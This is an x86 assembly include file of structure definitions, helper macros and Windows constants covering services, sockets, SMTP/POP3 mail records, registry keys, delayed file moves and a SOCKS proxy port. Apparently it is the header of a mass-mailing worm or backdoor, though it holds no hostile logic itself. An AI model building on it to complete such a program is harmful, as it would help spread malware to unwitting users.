   SERVICE_TABLE_ENTRY struc
       STE_ServiceName dd  ?
       STE_ServiceProc dd  ?
   SERVICE_TABLE_ENTRY ends

   SERVICE_STATUS      struc
       SS_ServiceType          dd  ?
       SS_CurrentState         dd  ?
       SS_ControlsAccepted     dd  ?
       SS_Win32ExitCode        dd  ?
       SS_ServiceSpecificExitCode  dd  ?
       SS_CheckPoint           dd  ?
       SS_WaitHint         dd  ?
   SERVICE_STATUS      ends

   OVERLAPPED      struc
       O_Internal  dd  ?
       O_InternalHigh  dd  ?
       O_loffset   dd  ?
       O_OffsetHigh    dd  ?
       O_hEvent    dd  ?
   OVERLAPPED      ends

   sockaddr_in struc
       sin_family  dw  ?
       sin_port    dw  ?
       sin_addr    dd  ?
       sin_zero    db  8 dup (?)
   sockaddr_in ends

   hostent     struc
       h_name      dd  ?
       h_alias     dd  ?
       h_addr      dw  ?
       h_len       dw  ?
       h_list      dd  ?
   hostent     ends

   timeval     struc
       tv_sec  dd  ?
       tv_usec dd  ?
   timeval     ends

   fd_set      struc
       fd_count    dd  ?
       fd_array    dd  ?
   fd_set      ends

   RASCONNSTATUSA      struc
       RCS_dwSize      dd  ?
       RCS_rasconnstate    dd  ?
       RCS_dwError     dd  ?
       RCS_szDeviceType    db  16 + 1 dup(?)
       RCS_szDeviceName    db  128 + 1 dup(?)
   RASCONNSTATUSA      ends

   _email_     struc
       EM_MailFrom dd  ?   ; pointer to ASCIIZ
       EM_RcptTo   dd  ?   ; pointer to ASCIIZ
       EM_Subject  dd  ?   ; pointer to ASCIIZ
       EM_Message  dd  ?   ; pointer to ASCIIZ
       EM_FilezNum dd  ?   ; number of filez; if highest bit is set
                       ; then in EM_Filez is a *.msg file
       EM_Filez    dd  ?   ; pointer to ASCIIZ pointerz
   _email_     ends

   SYSTEMTIME  struc
       ST_Year     dw  ?
       ST_Month    dw  ?
       ST_DayOfWeek    dw  ?
       ST_Day      dw  ?
       ST_Hour     dw  ?
       ST_Minute   dw  ?
       ST_Second   dw  ?
       ST_Milliseconds dw  ?
   SYSTEMTIME  ends

   oper        struc
       OP_Oper     dd  ?
       OP_Rites    db  ?   ; 1 - RW; 0 - Ronly
   oper        ends

   @copy       macro   source
       local   copy_end
       local   copy_loop
       push esi
       mov esi, source
   copy_loop:
       lodsb
       test al, al
       jz copy_end
       stosb
       jmp copy_loop
   copy_end:
       pop esi
   endm

   @endsz_     macro
           local   nxtchr
           push esi
           mov esi, edi
   nxtchr:
       lodsb
       test al, al
       jnz nxtchr
       xchg esi, edi
       pop esi
   endm

   @pushvar    macro   variable, empty
       local   next_instr
       ifnb <empty>
       %out too much arguments in macro '@pushvar'
       .err
       endif
       call next_instr
       variable
   next_instr:
   endm

       CR_LF               equ 0a0dh
       WAIT_TIMEOUT            equ     103h
       SMTP_PORT           equ 25

       SC_MANAGER_CONNECT      equ 1
       SC_MANAGER_CREATE_SERVICE   equ 2
       DELETE              equ 10000h
       SERVICE_AUTO_START      equ 2
       SERVICE_WIN32_OWN_PROCESS   equ 10h
       SERVICE_ACCEPT_SHUTDOWN     equ 4
       SERVICE_CONTROL_RUN     equ 0
       CK_SERVICE_CONTROL      equ 0
       CK_PIPE             equ 1
       NO_ERROR            equ 0

       SERVICE_CONTROL_INTERROGATE equ 4
       SERVICE_CONTROL_SHUTDOWN    equ 5

       SERVICE_STOPPED         equ 1
       SERVICE_START_PENDING       equ 2
       SERVICE_STOP_PENDING        equ 3
       SERVICE_RUNNING         equ 4
       SERVICE_CONTINUE_PENDING    equ 5
       SERVICE_PAUSE_PENDING       equ 6
       SERVICE_PAUSED          equ 7

       PIPE_ACCESS_OUTBOUND        equ 2
       PIPE_TYPE_BYTE          equ 0
       FILE_FLAG_OVERLAPPED        equ 40000000h

       INFINITE            equ -1

       AF_INET         equ 2
       HEAP_ZERO_MEMORY    equ 8
       SOCK_STREAM     equ 1
       CR_LF           equ 0a0dh
       MAX_ALLOWED_OPERZ   equ 5
       SYNCHRONIZE     equ 100000h

       RASCS_CONNECTED     equ 2000h
       MOVEFILE_DELAY_UNTIL_REBOOT equ 4
       HKEY_LOCAL_MACHINE  equ 80000002h
       KEY_ENUMERATE_SUB_KEYS  equ 8h
       HKEY_USERS      equ 80000003h
       KEY_QUERY_VALUE     equ 1
       KEY_SET_VALUE       equ 2
       REG_SZ          equ 1
       REG_DWORD       equ 4
       ERROR_NO_MORE_ITEMS equ 259

       INET_THREADZ_COUNT  equ 2
       INTERNET_OPEN_TYPE_DIRECT   equ 1

       POP3_PORT       equ 110
       OK          equ " KO+"
       ERROR           equ "RRE-"

       SOXZ_PORT       equ 1080

   STARTUPINFO STRUCT              ;used by CreateProcessA API
       cb      DWORD   ?
       lpReserved  DWORD   ?
       lpDesktop   DWORD   ?
       lpTitle     DWORD   ?
       dwX     DWORD   ?
       dwY     DWORD   ?
       dwXSize     DWORD   ?
       dwYSize     DWORD   ?
       dwXCountChars   DWORD   ?
       dwYCountChars   DWORD   ?
       dwFillAttribute DWORD   ?
       dwFlags     DWORD   ?
       wShowWindow WORD    ?
       cbReserved2 WORD    ?
       lpReserved2 DWORD   ?
       hStdInput   DWORD   ?
       hStdOutput  DWORD   ?
       hStdError   DWORD   ?
   STARTUPINFO ENDS
   PROCESS_INFORMATION STRUCT
       hProcess    DWORD   ?
       hThread     DWORD   ?
       dwProcessId DWORD   ?
       dwThreadId  DWORD   ?
   PROCESS_INFORMATION ENDS

       GMEM_ZEROINIT       equ 040h
